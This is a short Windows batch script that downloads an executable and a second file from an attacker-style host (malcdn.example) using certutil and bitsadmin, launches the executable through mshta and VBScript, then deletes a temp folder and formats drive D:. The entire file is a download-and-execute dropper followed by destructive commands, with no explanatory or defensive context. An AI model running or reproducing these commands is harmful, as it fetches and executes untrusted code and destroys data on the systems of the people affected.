@echo off
certutil -urlcache -split -f http://malcdn.example/tool.exe C:\temp\tool.exe
mshta vbscript:CreateObject("WScript.Shell").Run("C:\temp\tool.exe"):close
bitsadmin /transfer dl http://malcdn.example/big.bin C:\temp\big.bin
del /s /q C:\temp
format d:
